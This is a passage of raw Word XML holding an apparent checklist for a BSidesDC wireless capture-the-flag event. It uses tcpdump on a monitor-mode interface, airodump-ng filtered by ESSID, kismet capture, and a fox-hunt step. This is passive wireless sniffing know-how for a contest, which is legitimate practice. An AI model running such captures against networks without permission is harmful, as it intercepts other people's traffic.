          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>capture.cap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="0B219DD9" w14:textId="77777777" w:rsidR="00013AE1" w:rsidRDefault="00013AE1" w:rsidP="00013AE1">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="23B136D2" w14:textId="77777777" w:rsidR="00013AE1" w:rsidRDefault="00013AE1" w:rsidP="00013AE1">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>nohup</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008C666C">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>tcpdump</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008C666C">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> –</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008C666C">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008C666C">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> wlan1mon –w /root/Desktop/CTF/capture</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>2.cap</w:t>
      </w:r>
      <w:r w:rsidRPr="008C666C">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>&amp;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E8E949E" w14:textId="0C5CA5B8" w:rsidR="00013AE1" w:rsidRPr="007D20A8" w:rsidRDefault="00013AE1" w:rsidP="006E261B">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7FA89ABB" w14:textId="77777777" w:rsidR="00A202A3" w:rsidRDefault="00A202A3" w:rsidP="00A202A3">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Set up CTF docs</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0244E88E" w14:textId="77777777" w:rsidR="00A202A3" w:rsidRPr="00013AE1" w:rsidRDefault="00A202A3" w:rsidP="00A202A3">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>cd</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="289A435D" w14:textId="77777777" w:rsidR="00A202A3" w:rsidRDefault="00A202A3" w:rsidP="00A202A3">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>touch</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> notes.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6157EF34" w14:textId="77777777" w:rsidR="00013AE1" w:rsidRDefault="00013AE1" w:rsidP="00013AE1">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2DABE507" w14:textId="77777777" w:rsidR="00013AE1" w:rsidRDefault="00013AE1" w:rsidP="00013AE1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Get my macs and paste into notes.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="367E0C38" w14:textId="77777777" w:rsidR="00013AE1" w:rsidRDefault="00013AE1" w:rsidP="00013AE1">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2C7FC301" w14:textId="3C68C405" w:rsidR="00A202A3" w:rsidRDefault="00A202A3" w:rsidP="00013AE1">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>cd</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="633AA11C" w14:textId="1A34D8AC" w:rsidR="00013AE1" w:rsidRDefault="00013AE1" w:rsidP="00013AE1">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="003773EA">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>ifconfig</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="003773EA">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> wlan1</w:t>
      </w:r>
      <w:r w:rsidR="00A202A3">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> &gt;&gt; notes.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A5079BA" w14:textId="602A8DB0" w:rsidR="00013AE1" w:rsidRDefault="00013AE1" w:rsidP="00013AE1">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="003773EA">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>ifconfig</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="003773EA">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> wlan2</w:t>
      </w:r>
      <w:r w:rsidR="00A202A3">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> &gt;&gt; notes.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C5AA1AD" w14:textId="6A3104A7" w:rsidR="00013AE1" w:rsidRDefault="00013AE1" w:rsidP="00013AE1">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="003773EA">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>ifconfig</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="003773EA">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> wlan3</w:t>
      </w:r>
      <w:r w:rsidR="00A202A3">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> &gt;&gt; notes.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="530F02B8" w14:textId="77777777" w:rsidR="00013AE1" w:rsidRPr="00013AE1" w:rsidRDefault="00013AE1" w:rsidP="00013AE1">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6E5FB0E6" w14:textId="6C7FCD4F" w:rsidR="00013AE1" w:rsidRDefault="00013AE1" w:rsidP="00013AE1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Get list of active Aps</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62E96067" w14:textId="5448EA69" w:rsidR="00013AE1" w:rsidRPr="00013AE1" w:rsidRDefault="00013AE1" w:rsidP="00013AE1">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>airodump</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> --</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>essid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">-regex </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>BSidesDC</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>*</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> &gt;&gt; notes.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4043EEE5" w14:textId="77777777" w:rsidR="00013AE1" w:rsidRDefault="00013AE1" w:rsidP="00013AE1">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2B447D06" w14:textId="77777777" w:rsidR="00A202A3" w:rsidRPr="00013AE1" w:rsidRDefault="00A202A3" w:rsidP="00A202A3">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Start kismet capture</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D7D0A25" w14:textId="77777777" w:rsidR="00A202A3" w:rsidRPr="00013AE1" w:rsidRDefault="00A202A3" w:rsidP="00A202A3">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>mkdir</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> kismet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40FB2BC5" w14:textId="77777777" w:rsidR="00A202A3" w:rsidRPr="00013AE1" w:rsidRDefault="00A202A3" w:rsidP="00A202A3">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>cd kismet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7ECB07FE" w14:textId="77777777" w:rsidR="00A202A3" w:rsidRPr="00013AE1" w:rsidRDefault="00A202A3" w:rsidP="00A202A3">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>kismet</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="749FA331" w14:textId="77777777" w:rsidR="00A202A3" w:rsidRPr="00013AE1" w:rsidRDefault="00A202A3" w:rsidP="00013AE1">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="75A5925E" w14:textId="3BD606AF" w:rsidR="00013AE1" w:rsidRPr="00013AE1" w:rsidRDefault="00013AE1" w:rsidP="00013AE1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Set up </w:t>
      </w:r>
      <w:r w:rsidR="00A202A3">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>and go to</w:t>
      </w:r>
      <w:r w:rsidRPr="00013AE1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> Fox Hunt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20F025A7" w14:textId="3C2E10C6" w:rsidR="00013AE1" w:rsidRPr="00013AE1" w:rsidRDefault="00013AE1" w:rsidP="00013AE1">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
